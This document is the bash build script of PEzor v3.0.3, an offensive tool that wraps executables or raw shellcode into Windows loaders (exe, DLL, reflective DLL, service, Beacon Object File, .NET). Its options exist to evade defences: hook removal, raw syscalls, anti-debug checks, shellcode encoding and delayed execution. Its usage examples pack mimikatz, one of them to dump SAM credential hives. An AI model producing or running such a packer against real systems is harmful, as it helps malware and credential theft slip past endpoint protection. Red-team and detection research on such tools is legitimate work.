#!/usr/bin/env bash

VERSION="3.0.3"

cowsay -f dragon 'PEzor!! v'$VERSION 2>/dev/null || echo 'PEzor!! v'$VERSION
echo '---------------------------------------------------------------------------'
echo 'Read the blog posts here:'
echo 'https://iwantmore.pizza/posts/PEzor.html'
echo 'https://iwantmore.pizza/posts/PEzor2.html'
echo 'https://iwantmore.pizza/posts/PEzor3.html'
echo 'https://iwantmore.pizza/posts/PEzor4.html'
echo 'Based on:'
echo 'https://github.com/TheWover/donut'
echo 'https://github.com/EgeBalci/sgn'
echo 'https://github.com/JustasMasiulis/inline_syscall'
echo 'https://github.com/CylanceVulnResearch/ReflectiveDLLRefresher'
echo '---------------------------------------------------------------------------'

CURRENT_DIR=`pwd`
INSTALL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TMP_DIR=/tmp
SGN=false
BLOB=false
IS_SHELLCODE=false
BITS=64
FORCED_BITS=false
SLEEP=0
DEBUG=false
SYSCALLS=false
UNHOOK=false
ANTIDEBUG=false
TEXT=false
SELF=false
RX=false
SDK=4.5
CC=x86_64-w64-mingw32-clang
CXX=x86_64-w64-mingw32-clang++
LD=x86_64-w64-mingw32-ld
OUTPUT_FORMAT=exe
OUTPUT_EXTENSION=exe
CLEANUP=false
SOURCES=""

usage() {
    echo 'Usage PE:        ./PEzor.sh [-32|-64] [-debug] [-syscalls] [-unhook] [-sleep=<SECONDS>] [-sgn] [-antidebug] [-text] [-self] [-rx] [-format=<FORMAT>] <executable.exe> [donut args]'
    echo 'Usage Shellcode: ./PEzor.sh [-32|-64] [-debug] [-syscalls] [-unhook] [-sleep=<SECONDS>] [-sgn] [-antidebug] [-text] [-self] [-rx] [-format=<FORMAT>] <shellcode.bin>'
    echo ''
    echo 'USAGE

# PEzor [options...] <EXECUTABLE> [donut args...]

OPTIONS
  -h                        Show usage and exits
  -32                       Force 32-bit executable
  -64                       Force 64-bit executable
  -debug                    Generate a debug build
  -unhook                   User-land hooks removal
  -antidebug                Add anti-debug checks
  -syscalls                 Use raw syscalls [64-bit only] [Windows 10 only]
  -sgn                      Encode the generated shellcode with sgn
  -text                     Store shellcode in .text section instead of .data
  -rx                       Allocate RX memory for shellcode
  -self                     Execute the shellcode in the same thread
  -sdk=VERSION              Use specified .NET Framework version (2, 4, 4.5 (default))
  -cleanup                  Perform the cleanup of allocated payload and loaded modules (only for BOFs)
  -sleep=N                  Sleeps for N seconds before unpacking the shellcode
  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
  [donut args...]           After the executable to pack, you can pass additional Donut args, such as -z 2

EXAMPLES
  # 64-bit (self-inject RWX)
  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/x64/mimikatz.exe -z 2
  # 64-bit (self-inject RX)
  $ PEzor.sh -unhook -antidebug -text -self -rx -sleep=120 mimikatz/x64/mimikatz.exe -z 2
  # 64-bit (raw syscalls)
  $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 mimikatz/x64/mimikatz.exe -z 2
  # 64-bit (beacon object file)
  $ PEzor.sh -format=bof mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 64-bit (beacon object file w/ cleanup)
  $ PEzor.sh -format=bof -cleanup mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 64-bit (reflective dll)
  $ PEzor.sh -format=reflective-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 64-bit (service exe)
  $ PEzor.sh -format=service-exe mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 64-bit (service dll)
  $ PEzor.sh -format=service-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 64-bit (dotnet)
  $ PEzor.sh -format=dotnet -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 64-bit (dotnet-pinvoke)
  $ PEzor.sh -format=dotnet-pinvoke -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 64-bit (dotnet-createsection)
  $ PEzor.sh -format=dotnet-createsection -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 32-bit (self-inject)
  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
  # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
  # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread) and arguments for donut
  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2 "-plsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv"

# PEzor <-32|-64> [options...] <SHELLCODE>

OPTIONS
  -h                        Show usage and exits
  -32                       Force 32-bit executable
  -64                       Force 64-bit executable
  -debug                    Generate a debug build
  -unhook                   User-land hooks removal
  -antidebug                Add anti-debug checks
  -shellcode                Force shellcode detection
  -syscalls                 Use raw syscalls [64-bit only] [Windows 10 only]
  -sgn                      Encode the provided shellcode with sgn
  -text                     Store shellcode in .text section instead of .data
  -rx                       Allocate RX memory for shellcode
  -self                     Execute the shellcode in the same thread [requires RX shellcode, not compatible with -sgn]
  -cleanup                  Perform the cleanup of allocated payload and loaded modules (only for BOFs)
  -sleep=N                  Sleeps for N seconds before unpacking the shellcode
  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)

EXAMPLES
  # 64-bit (self-inject RWX)
  $ PEzor.sh shellcode.bin
  # 64-bit (self-inject RX)
  $ PEzor.sh -unhook -antidebug -text -self -rx -sleep=120 shellcode.bin
  # 64-bit (self-inject)
  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
  # 64-bit (raw syscalls)
  $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 shellcode.bin
  # 64-bit (beacon object file)
  $ PEzor.sh -format=bof shellcode.bin
  # 64-bit (beacon object file w/ cleanup)
  $ PEzor.sh -format=bof -cleanup shellcode.bin
  # 64-bit (reflective dll)
  $ PEzor.sh -format=reflective-dll shellcode.bin
  # 64-bit (service exe)
  $ PEzor.sh -format=service-exe shellcode.bin
  # 64-bit (service dll)
  $ PEzor.sh -format=service-dll shellcode.bin
  # 64-bit (dotnet)
  $ PEzor.sh -format=dotnet shellcode.bin
  # 64-bit (dotnet-pinvoke)
  $ PEzor.sh -format=dotnet-pinvoke shellcode.bin
  # 64-bit (dotnet-createsection)
  $ PEzor.sh -format=dotnet-createsection shellcode.bin
  # 32-bit (self-inject)
  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
  # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 shellcode.bin'
}

if [ $# -eq 0 ]; then
    usage
    exit 1
fi

command -v $CXX >/dev/null 2>&1 || { echo >&2 "$CXX is missing from \$PATH. Check https://github.com/tpoechtrager/wclang to learn how to install it"; exit 1; }
command -v $CC >/dev/null 2>&1 || { echo >&2 "$CC is missing from \$PATH. Check https://github.com/tpoechtrager/wclang to learn how to install it"; exit 1; }
command -v donut >/dev/null 2>&1 || { echo >&2 "donut is missing from \$PATH. Check https://github.com/TheWover/donut to learn how to install it"; exit 1; }
command -v sgn >/dev/null 2>&1 || { echo >&2 "sgn is missing from \$PATH. Check https://github.com/EgeBalci/sgn to learn how to install it"; exit 1; }
command -v mcs >/dev/null 2>&1 || { echo >&2 "mcs is missing from \$PATH. Re-run install.sh script"; exit 1; }

# cleanup
rm -f $TMP_DIR/*.{s,ll,cpp,donut,bin}

for arg in "$@"
do
    shift
    case "$arg" in
        -h|help)
            usage
            exit 0
            ;;
        -debug)
            DEBUG=true
            echo "[?] Debug build enabled"
            ;;
        -32)
            BITS=32
            FORCED_BITS=true
            echo "[?] Forcing 32-bit architecture"
            ;;
        -64)
            BITS=64
            FORCED_BITS=true
            echo "[?] Forcing 64-bit architecture"
            ;;
        -text)
            TEXT=true
            echo "[?] Payload will be put in .text section"
            ;;
        -self)
            SELF=true
            echo "[?] Self-executing payload"
            ;;
        -antidebug)
            ANTIDEBUG=true
            echo "[?] Anti-debug enabled"
            ;;
        -syscalls)
            SYSCALLS=true
            echo "[?] Syscalls enabled"
            ;;
        -unhook)
            UNHOOK=true
            echo "[?] Unhook enabled"
            ;;
        -shellcode)
            IS_SHELLCODE=true
            echo "[?] Forcing shellcode detection"
            ;;
        -cleanup)
            CLEANUP=true
            echo "[?] Forcing shellcode detection"
            ;;
        -sleep=*)
            SLEEP="${arg#*=}"
            echo "[?] Waiting $SLEEP seconds before executing the payload"
            ;;
        -sgn)
            echo '[?] Final shellcode will be encoded with sgn'
            SGN=true
            ;;
        -rx)
            echo '[?] Allocating RX memory for execution'
            echo "[*] Warning: -rx supports RX shellcode only"
            RX=true
            ;;
        -format=*)
            OUTPUT_FORMAT="${arg#*=}"
            echo "[?] Output format: $OUTPUT_FORMAT"
            ;;
        -sdk=*)
            SDK="${arg#*=}"
            echo "[?] .NET SDK: $SDK"
            ;;
        *)
            echo "[?] Processing $arg"
            ls $arg 1>/dev/null 2>&1 || { echo "[x] ERROR: $arg doesn't exist"; exit 1; }
            BLOB=$arg
            break
            ;;
    esac
done

if [ ! $IS_SHELLCODE ]; then
    file $BLOB | grep -q ': data' && { IS_SHELLCODE=true; }
    file $BLOB | grep -q ': DOS executable (COM)' && { IS_SHELLCODE=true; } # false positive
fi

if [ $FORCED_BITS = false ]; then
    file $BLOB | grep -vq 'x86-64' && file $BLOB | grep -q 'PE32' && { BITS=32; }
fi

if [ $BITS -eq 32 ] && [ $SYSCALLS = true ]; then
    echo '[x] Error: cannot inline syscalls with 32bits applications'
    exit 1
fi

if [[ $OUTPUT_FORMAT == dotnet* ]] && [ $SYSCALLS = true ]; then
    echo '[x] Error: cannot inline syscalls when targeting .NET'
    exit 1
fi

if [[ $OUTPUT_FORMAT == bof ]] && [ $UNHOOK = true ]; then
    echo '[x] Error: cannot unhook when targeting BOFs'
    exit 1
fi

if [[ $OUTPUT_FORMAT == bof ]] && [ $SELF = true ]; then
    echo '[x] Error: cannot self-execute when targeting BOFs'
    exit 1
fi

if [ $RX = true ] && [ $SGN = true ]; then
    echo '[x] Error: cannot encode the shellcode when self-executing the payload'
    exit 1
fi

if [ $IS_SHELLCODE = true ]; then
    echo '[?] Shellcode detected'
    IS_SHELLCODE=true
else
    echo -n '[?] PE detected: '
    file $BLOB
fi

rm -f $TMP_DIR/{shellcode,sleep}.cpp{,donut} $TMP_DIR/{ApiSetMap,loader}.o $TMP_DIR/Global.cs

case $OUTPUT_FORMAT in
    exe)
        echo '[?] Building executable'
        OUTPUT_EXTENSION=exe
        ;;
    dll)
        echo '[?] Building shared library'
        OUTPUT_EXTENSION=dll
        ;;
    reflective-dll)
        echo '[?] Building reflective shared library'
        OUTPUT_EXTENSION=reflective.dll
        ;;
    service-exe)
        echo '[?] Building service executable'
        OUTPUT_EXTENSION=service.exe
        ;;
    service-dll)
        echo '[?] Building service shared library'
        OUTPUT_EXTENSION=service.dll
        ;;
    dotnet*)
        echo '[?] Building .NET executable'
        OUTPUT_EXTENSION=dotnet.exe
        ;;
    bof)
        echo '[?] Building Beacon Object File (BOF)'
        if [ $BITS -eq 32 ]; then
            OUTPUT_EXTENSION=x86.o
        else
            OUTPUT_EXTENSION=x64.o
        fi
        ;;
esac

case $OUTPUT_FORMAT in
    exe | dll | reflective-dll | service-exe | service-dll | bof)
        echo "unsigned int sleep_time = $SLEEP;" > $TMP_DIR/sleep.cpp
        if [ $IS_SHELLCODE = false ] && [ $SGN = false ]; then
            echo '[?] Executing donut' &&
            (donut -i $BLOB -o $TMP_DIR/shellcode.bin.donut "$@" || exit 1) &&
            echo '#pragma clang diagnostic ignored "-Woverlength-strings"' >> $TMP_DIR/shellcode.cpp &&
            if [ $TEXT = true ]; then echo '__attribute__((section (".text")))' >> $TMP_DIR/shellcode.cpp; fi &&
            echo -n 'unsigned char buf[] = "' >> $TMP_DIR/shellcode.cpp &&
            od -vtx1 $TMP_DIR/shellcode.bin.donut | sed -e 's/^[0-9]* //' -e '$d' -e 's/^/ /' -e 's/ /\\x/g' | tr -d '\n' >> $TMP_DIR/shellcode.cpp &&
            echo '";' >> $TMP_DIR/shellcode.cpp &&
            echo 'unsigned int buf_size = sizeof(buf);' >> $TMP_DIR/shellcode.cpp || exit 1
        else
            if [ $IS_SHELLCODE = false ]; then
                echo '[?] Executing donut' &&
                (donut -i $BLOB -o $TMP_DIR/shellcode.bin.donut "$@" || exit 1)
            else
                cp $BLOB $TMP_DIR/shellcode.bin.donut
            fi

            if [ $SGN = true ]; then
                echo '[?] Executing sgn' &&
                (sgn -a $BITS -c 1 -o $TMP_DIR/shellcode.bin $TMP_DIR/shellcode.bin.donut || exit 1)
            else
                cp $TMP_DIR/shellcode.bin.donut $TMP_DIR/shellcode.bin
            fi

            echo '#pragma clang diagnostic ignored "-Woverlength-strings"' >> $TMP_DIR/shellcode.cpp &&
            if [ $TEXT = true ]; then echo '__attribute__((section (".text")))' >> $TMP_DIR/shellcode.cpp; fi &&
            echo -n 'unsigned char buf[] = "' >> $TMP_DIR/shellcode.cpp &&
            od -vtx1 $TMP_DIR/shellcode.bin | sed -e 's/^[0-9]* //' -e '$d' -e 's/^/ /' -e 's/ /\\x/g' | tr -d '\n' >> $TMP_DIR/shellcode.cpp &&
            echo '";' >> $TMP_DIR/shellcode.cpp &&
            echo 'unsigned int buf_size = sizeof(buf);' >> $TMP_DIR/shellcode.cpp || exit 1
        fi

        CCFLAGS="-O3 -Wl,-strip-all -Wall -pedantic"
        CPPFLAGS="-O3 -Wl,-strip-all -Wall -pedantic"
        CXXFLAGS="-std=c++17 -static"

        if [ $BITS -eq 32 ]; then
            CC=i686-w64-mingw32-clang
            CXX=i686-w64-mingw32-clang++
            CCFLAGS="$CCFLAGS -m32 -DWIN_X86"
            CPPFLAGS="$CPPFLAGS -m32 -DWIN_X86"
        else
            CCFLAGS="$CCFLAGS -D_WIN64 -DWIN_X64"
            CPPFLAGS="$CPPFLAGS -D_WINX64 -DWIN_X64"
        fi

        if [ $DEBUG = true ]; then
            CCFLAGS="$CCFLAGS -D_DEBUG_"
            CPPFLAGS="$CPPFLAGS -D_DEBUG_"
        fi

        if [ $SYSCALLS = true ]; then
            CCFLAGS="$CCFLAGS -DSYSCALLS"
            CPPFLAGS="$CPPFLAGS -DSYSCALLS"
        fi

        if [ $UNHOOK = true ]; then
            CCFLAGS="$CCFLAGS -DUNHOOK"
            CPPFLAGS="$CPPFLAGS -DUNHOOK"
        fi

        if [ $ANTIDEBUG = true ]; then
            CCFLAGS="$CCFLAGS -DANTIDEBUG"
            CPPFLAGS="$CPPFLAGS -DANTIDEBUG"
        fi

        if [ $SELF = true ]; then
            CCFLAGS="$CCFLAGS -DSELFINJECT"
            CPPFLAGS="$CPPFLAGS -DSELFINJECT"
        fi

        if [ $RX = true ]; then
            CCFLAGS="$CCFLAGS -DRX"
            CPPFLAGS="$CPPFLAGS -DRX"
        fi

        if [ $TEXT = true ]; then
            CCFLAGS="$CCFLAGS -D_TEXT_"
            CPPFLAGS="$CPPFLAGS -D_TEXT_"
        fi

        if [ $CLEANUP = true ]; then
            CCFLAGS="$CCFLAGS -D_CLEANUP_"
            CPPFLAGS="$CPPFLAGS -D_CLEANUP_"
        fi

        if [ $OUTPUT_FORMAT = "dll" ]; then
            CCFLAGS="$CCFLAGS -shared -DSHAREDOBJECT"
            CPPFLAGS="$CPPFLAGS -shared -DSHAREDOBJECT"
        elif [ $OUTPUT_FORMAT = "reflective-dll" ]; then
            CCFLAGS="$CCFLAGS -shared -DSHAREDOBJECT -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN"
            CPPFLAGS="$CPPFLAGS -shared -DSHAREDOBJECT -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN"
        elif [ $OUTPUT_FORMAT = "service-exe" ]; then
            CCFLAGS="$CCFLAGS -DSERVICE_EXE"
            CPPFLAGS="$CPPFLAGS -DSERVICE_EXE"
        elif [ $OUTPUT_FORMAT = "service-dll" ]; then
            CCFLAGS="$CCFLAGS -shared -DSHAREDOBJECT -DSERVICE_EXE -DSERVICE_DLL"
            CPPFLAGS="$CPPFLAGS -shared -DSHAREDOBJECT -DSERVICE_EXE -DSERVICE_DLL"
        elif [ $OUTPUT_FORMAT = "bof" ]; then
            CCFLAGS="$CCFLAGS -c -D_BOF_"
            CPPFLAGS="$CPPFLAGS -c -D_BOF_"
        fi

        if [ $OUTPUT_FORMAT = "reflective-dll" ]; then
            $CC $CCFLAGS -c $INSTALL_DIR/ReflectiveDLLInjection/dll/src/ReflectiveLoader.c -o $TMP_DIR/ReflectiveLoader.o
            SOURCES="$SOURCES $TMP_DIR/ReflectiveLoader.o"
        fi

        if [ $UNHOOK = true ] || [ $ANTIDEBUG = true ]; then
            $CC $CCFLAGS -c $INSTALL_DIR/ApiSetMap.c -o $TMP_DIR/ApiSetMap.o &&
            SOURCES="$SOURCES $TMP_DIR/ApiSetMap.o"
        fi

        if [ $UNHOOK = true ]; then
            $CC $CCFLAGS -c $INSTALL_DIR/loader.c -o $TMP_DIR/loader.o &&
            SOURCES="$SOURCES $TMP_DIR/loader.o"
        fi

        if [ $OUTPUT_FORMAT = "bof" ]; then
            # $CXX $CPPFLAGS $CXXFLAGS -Wl,--disable-auto-import -Wl,--disable-runtime-pseudo-reloc $TMP_DIR/shellcode.cpp -c -o $TMP_DIR/shellcode.o
            # $CXX $CPPFLAGS $CXXFLAGS $TMP_DIR/sleep.cpp -c -o $TMP_DIR/sleep.o &&
            # $CXX $CPPFLAGS $CXXFLAGS $INSTALL_DIR/inject.cpp -c -o $TMP_DIR/inject.o &&
            grep -v '#include "inject.hpp"' $INSTALL_DIR/inject.cpp > $TMP_DIR/inject.cpp &&
            cat $TMP_DIR/{shellcode,sleep}.cpp $INSTALL_DIR/bof.cpp $TMP_DIR/inject.cpp > $TMP_DIR/bof.cpp &&
            cp $INSTALL_DIR/{sleep,inject,syscalls}.hpp $INSTALL_DIR/beacon.h $TMP_DIR &&
            mkdir -p $TMP_DIR/deps/inline_syscall/include &&
            cp $INSTALL_DIR/deps/inline_syscall/include/* $TMP_DIR/deps/inline_syscall/include &&
            $CXX -mno-stack-arg-probe $CPPFLAGS $CXXFLAGS $TMP_DIR/bof.cpp -c -o $BLOB.packed.$OUTPUT_EXTENSION || exit 1
            # x86_64-w64-mingw32-ld -r $TMP_DIR/{sleep,bof,inject}.o -o $BLOB.packed.$OUTPUT_EXTENSION
        else
            $CXX $CPPFLAGS $CXXFLAGS $INSTALL_DIR/{inject,PEzor}.cpp $TMP_DIR/{shellcode,sleep}.cpp $SOURCES -o $BLOB.packed.$OUTPUT_EXTENSION &&
            strip $BLOB.packed.$OUTPUT_EXTENSION || exit 1
        fi
        ;;
    dotnet*)
        echo 'public static class Global {' >> $TMP_DIR/Global.cs &&
        echo "public static int sleep_time = $SLEEP;" >> $TMP_DIR/Global.cs &&
        echo -n 'public static ' >> $TMP_DIR/Global.cs
        if [ $IS_SHELLCODE = false ] && [ $SGN = false ]; then
            echo '[?] Executing donut' &&
            (donut -i $BLOB -f 7 -o $TMP_DIR/shellcode.cs "$@" || exit 1) &&
            cat $TMP_DIR/shellcode.cs >> $TMP_DIR/Global.cs
        else
            if [ $IS_SHELLCODE = false ]; then
                echo '[?] Executing donut' &&
                (donut -i $BLOB -o $TMP_DIR/shellcode.bin.donut "$@" || exit 1)
            else
                cp $BLOB $TMP_DIR/shellcode.bin.donut
            fi

            if [ $SGN = true ]; then
                echo '[?] Executing sgn' &&
                (sgn -a $BITS -c 1 -o $TMP_DIR/shellcode.bin $TMP_DIR/shellcode.bin.donut || exit 1)
            else
                cp $TMP_DIR/shellcode.bin.donut $TMP_DIR/shellcode.bin
            fi

            echo -n 'byte[] my_buf = {' >> $TMP_DIR/Global.cs &&
            od -vtx1 $TMP_DIR/shellcode.bin | sed -e 's/^[0-9]* //' -e '$d' -e 's/^/ /' -e 's/ /,0x/g' -e 's/^,//g' | sed -z -e 's/\n/,/g' -e 's/,$//g' >> $TMP_DIR/Global.cs &&
            echo -n '};' >> $TMP_DIR/Global.cs
        fi
        echo '}' >> $TMP_DIR/Global.cs
        DOTNET_FLAGS="-unsafe -debug-"

        if [ ! $SDK = "4.5" ]; then
            DOTNET_FLAGS="$DOTNET_FLAGS -sdk:$SDK"
        fi

        if [ $BITS -eq 32 ]; then
            DOTNET_FLAGS="$DOTNET_FLAGS -platform:x86"
        else
            DOTNET_FLAGS="$DOTNET_FLAGS -platform:x64"
        fi

        if [ $DEBUG = true ]; then
            DOTNET_FLAGS="$DOTNET_FLAGS -define:_DEBUG_"
        fi

        if [ $SELF = true ]; then
            DOTNET_FLAGS="$DOTNET_FLAGS -define:SELFINJECT"
        fi

        if [ $RX = true ]; then
            DOTNET_FLAGS="$DOTNET_FLAGS -define:RX"
        fi

        case $OUTPUT_FORMAT in
        dotnet)
            mcs $DOTNET_FLAGS -out:$BLOB.packed.$OUTPUT_EXTENSION $INSTALL_DIR/dotnet/*.cs $TMP_DIR/Global.cs
            ;;
        dotnet-pinvoke)
            DOTNET_FLAGS="$DOTNET_FLAGS -define:PINVOKE"
            mcs $DOTNET_FLAGS -out:$BLOB.packed.$OUTPUT_EXTENSION $INSTALL_DIR/dotnet/Program.cs $TMP_DIR/Global.cs
            ;;
        dotnet-createsection)
            DOTNET_FLAGS="$DOTNET_FLAGS -define:MAPVIEWOFSECTION"
            mcs $DOTNET_FLAGS -out:$BLOB.packed.$OUTPUT_EXTENSION $INSTALL_DIR/dotnet/*.cs $TMP_DIR/Global.cs
            ;;
        esac

        ;;
esac

echo -n '[!] Done! Check '; file $BLOB.packed.$OUTPUT_EXTENSION
